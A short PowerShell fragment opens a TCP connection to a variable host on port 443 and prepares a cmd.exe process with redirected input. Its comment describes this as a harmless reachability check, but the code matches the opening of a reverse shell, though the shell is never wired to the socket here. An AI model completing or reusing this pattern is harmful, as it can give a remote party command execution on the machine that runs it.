# An outbound reachability check and independent child input redirection.
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($hostName, 443)
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $env:ComSpec
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.UseShellExecute = 0
